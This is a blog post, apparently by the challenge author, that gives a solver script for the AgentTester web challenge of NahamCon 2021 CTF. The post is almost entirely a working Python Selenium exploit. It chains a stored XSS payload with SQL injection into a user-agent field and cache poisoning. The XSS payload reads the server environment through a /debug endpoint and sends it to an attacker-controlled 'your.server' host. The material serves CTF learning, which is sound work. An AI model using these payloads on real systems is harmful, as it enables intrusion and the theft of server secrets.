@@ -1,0 +1,333 @@
+<!DOCTYPE html><html lang="en"><head>
+    
+      <title>
+        NahamCon 2021 CTF&#39;s AgentTester solver ::
+        jorgectf — blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="NahamCon CTF&amp;rsquo;s AgentTester solver."/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://jorgectf.gitlab.io/blog/post/nahamconctf-2021-agenttester/"/>
+
+
+
+
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/assets/style.css"/>
+
+<link rel="stylesheet" href="https://jorgectf.gitlab.io/blog/style.css"/>
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://jorgectf.gitlab.io/blog/img/apple-touch-icon-144-precomposed.png"/>
+<link rel="shortcut icon" href="https://jorgectf.gitlab.io/blog/img/favicon.png"/>
+
+
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+<link href="https://jorgectf.gitlab.io/blog/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin=""/>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="NahamCon 2021 CTF&#39;s AgentTester solver"/>
+<meta name="twitter:description" content="NahamCon CTF’s AgentTester solver."/>
+
+
+
+<meta property="og:title" content="NahamCon 2021 CTF&#39;s AgentTester solver"/>
+<meta property="og:description" content="NahamCon CTF’s AgentTester solver."/>
+<meta property="og:type" content="article"/>
+<meta property="og:url" content="https://jorgectf.gitlab.io/blog/post/nahamconctf-2021-agenttester/"/><meta property="article:section" content="post"/>
+<meta property="article:published_time" content="2020-03-12T00:00:00+00:00"/>
+<meta property="article:modified_time" content="2020-03-12T00:00:00+00:00"/><meta property="og:site_name" content="jorgectf"/>
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+    
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+    
+    <li><a href="https://jorgectf.gitbook.io/awae-oswe-preparation-resources/">OSWE Cheatsheet</a></li>
+    
+    
+    
+    <li><a href="https://jorgectf.gitlab.io/blog/research/">Research</a></li>
+    
+    
+    <li><a href="../">About</a></li>
+  </ul>
+</nav>
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"></path>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"></path>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">NahamCon 2021 CTF’s AgentTester solver</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-03-12
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/ctf/">#CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/nahamcon-ctf/">#NahamCon CTF</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/web/">#Web</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/xss/">#XSS</a> 
+        
+          <a href="https://jorgectf.gitlab.io/blog/tags/cache-poisoning/">#Cache poisoning</a> 
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>Context: <a href="https://twitter.com/jorge_ctf/status/1370363270448742403" target="_blank">tweet</a>.</p>
+<p>Challenge <a href="https://github.com/jorgectf/Created-CTF-Challenges/tree/main/challenges/AgentTester%20@%20NahamConCTF%202021" target="_blank">source</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> selenium <span style="color:#f92672">import</span> webdriver
+<span style="color:#f92672">from</span> selenium.webdriver.common.keys <span style="color:#f92672">import</span> Keys
+<span style="color:#f92672">from</span> selenium.webdriver.common.by <span style="color:#f92672">import</span> By
+<span style="color:#f92672">from</span> selenium.webdriver.support.ui <span style="color:#f92672">import</span> WebDriverWait
+<span style="color:#f92672">from</span> selenium.webdriver.support <span style="color:#f92672">import</span> expected_conditions <span style="color:#66d9ef">as</span> ec
+<span style="color:#f92672">from</span> selenium.webdriver.common.desired_capabilities <span style="color:#f92672">import</span> DesiredCapabilities
+<span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string
+<span style="color:#f92672">import</span> requests
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">random_string</span>(length):
+  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_uppercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span>length))
+
+chall_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://challenge.nahamcon.com:1337&#34;</span> <span style="color:#75715e"># Change this</span>
+remote_server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://your.server&#34;</span> <span style="color:#75715e"># Change this</span>
+
+username, password, uAgent <span style="color:#f92672">=</span> random_string(<span style="color:#ae81ff">10</span>), random_string(<span style="color:#ae81ff">10</span>), random_string(<span style="color:#ae81ff">10</span>)
+email <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">@</span><span style="color:#e6db74">{</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">.com&#34;</span>
+
+XSS <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;&#34;&gt;&lt;script&gt;fetch(&#39;/debug&#39;, {method: &#39;POST&#39;, headers: new Headers({&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;}), body: &#34;code={{ environ }}&#34;}).then(response =&gt; response.text()).then(data =&gt; fetch(&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/?leak=&#34;+encodeURIComponent(data)));&lt;/script&gt;&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> remote_server
+
+options <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>ChromeOptions()
+<span style="color:#75715e"># options.add_argument(&#39;--headless&#39;)</span>
+options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#39;--no-sandbox&#39;</span>)
+options<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;user-agent=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> uAgent)
+
+<span style="color:#75715e"># driver = webdriver.Remote(&#34;HUB_URL&#34;, options=options)</span>
+driver <span style="color:#f92672">=</span> webdriver<span style="color:#f92672">.</span>Chrome(options<span style="color:#f92672">=</span>options)
+
+driver<span style="color:#f92672">.</span>get(chall_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/signup&#34;</span>)
+
+<span style="color:#75715e"># Sing Up</span>
+WebDriverWait(driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;usernameInput&#34;</span>)))
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;usernameInput&#34;</span>)<span style="color:#f92672">.</span>send_keys(username)
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;emailInput&#34;</span>)<span style="color:#f92672">.</span>send_keys(email)
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;password1Input&#34;</span>)<span style="color:#f92672">.</span>send_keys(password)
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;password2Input&#34;</span>)<span style="color:#f92672">.</span>send_keys(password)
+driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;//button[@type=&#39;submit&#39;]&#34;</span>)<span style="color:#f92672">.</span>click()
+
+<span style="color:#75715e"># Sign In</span>
+WebDriverWait(driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;passwordInput&#34;</span>)))
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;usernameInput&#34;</span>)<span style="color:#f92672">.</span>send_keys(username)
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;passwordInput&#34;</span>)<span style="color:#f92672">.</span>send_keys(password)
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;submitButton&#34;</span>)<span style="color:#f92672">.</span>click()
+WebDriverWait(driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;userAgentInput&#34;</span>)))
+
+<span style="color:#75715e"># Retrieve session cookie</span>
+session_cookie <span style="color:#f92672">=</span> driver<span style="color:#f92672">.</span>get_cookie(<span style="color:#e6db74">&#39;auth2&#39;</span>)[<span style="color:#e6db74">&#34;value&#34;</span>]
+
+<span style="color:#75715e"># Submit XSS in /profile/&lt;id&gt;</span>
+driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;//a[contains(@href,&#39;profile&#39;)]&#34;</span>)<span style="color:#f92672">.</span>click()
+WebDriverWait(driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;aboutInput&#34;</span>)))
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;aboutInput&#34;</span>)<span style="color:#f92672">.</span>send_keys(XSS)
+profile_id <span style="color:#f92672">=</span> driver<span style="color:#f92672">.</span>current_url<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;/&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#75715e"># get profile ID</span>
+driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;//button[@type=&#39;submit&#39;]&#34;</span>)<span style="color:#f92672">.</span>click()
+WebDriverWait(driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;aboutInput&#34;</span>)))
+
+<span style="color:#75715e"># SQLi to make the backend browser visit our profile</span>
+SQLi <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;&#39; UNION SELECT &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;, &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39; -- &#34;&#34;&#34;</span> <span style="color:#f92672">%</span> (uAgent, <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>chall_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/profile/</span><span style="color:#e6db74">{</span>profile_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;//span[contains(@class,&#39;title&#39;)]&#34;</span>)<span style="color:#f92672">.</span>click()
+WebDriverWait(driver, <span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>until(ec<span style="color:#f92672">.</span>element_to_be_clickable((By<span style="color:#f92672">.</span>ID, <span style="color:#e6db74">&#34;userAgentInput&#34;</span>)))
+driver<span style="color:#f92672">.</span>find_element_by_id(<span style="color:#e6db74">&#34;userAgentInput&#34;</span>)<span style="color:#f92672">.</span>send_keys(SQLi)
+driver<span style="color:#f92672">.</span>find_element_by_xpath(<span style="color:#e6db74">&#34;//button[@type=&#39;submit&#39;]&#34;</span>)<span style="color:#f92672">.</span>click()
+
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+  print(<span style="color:#e6db74">&#34;Making request to keep the profile cached... Check your logs!&#34;</span>)
+  print(requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>chall_url<span style="color:#e6db74">}</span><span style="color:#e6db74">/profile/</span><span style="color:#e6db74">{</span>profile_id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;auth2&#39;</span>: session_cookie}, headers<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;User-Agent&#39;</span>: uAgent})<span style="color:#f92672">.</span>headers)
+</code></pre></div>
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr/>
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="https://jorgectf.gitlab.io/blog/post/linectf-2021-your-notes/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">LineCTF Your Notes solver</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="https://jorgectf.gitlab.io/blog/post/h-con-final-writeup/">
+                  <span class="button__text">Hackplayers Conference 2020 Final CTF Writeup</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+<script src="https://unpkg.com/shiki"></script>
+
+<script>
+    if (document.querySelector("code[data-lang*='ql']")) {
+        shiki
+            .getHighlighter({
+                theme: 'github-dark',
+                langs: [
+                    {
+                        id: 'codeql',
+                        scopeName: 'source.ql',
+                        path: '/languages/codeql.tmLanguage.json',
+                        samplePath: 'codeql.sample',
+                        aliases: ['ql']
+                    }
+                ]
+            })
+            .then(highlighter => {
+                for (codeElement of document.querySelectorAll("code[data-lang]")) {
+                    try {
+                        let prev = codeElement.textContent
+                        let code = highlighter.codeToHtml(prev, { lang: codeElement.dataset.lang.toString() })
+                        codeElement.parentNode.innerHTML = code
+                    } catch(err) {
+                        console.log(err)
+                    }
+                }
+                for (shikiElement of document.querySelectorAll("pre[class='shiki']")) {
+                    shikiElement.parentNode.parentNode.replaceChild(
+                        shikiElement, shikiElement.parentNode
+                    )
+                }
+            })
+    }
+</script>
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://jorgectf.gitlab.io/blog/" class="logo" style="text-decoration: none;">
+  
+  <img src="https://jorgectf.gitlab.io/blog/logo.png" alt="jorgectf"/>
+  
+</a>
+      <div class="copyright">
+        <span>© 2021 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://jorgectf.gitlab.io/blog/assets/main.js"></script>
+
+
+      
+    </div>
+
+    
+  
+
+</body></html>
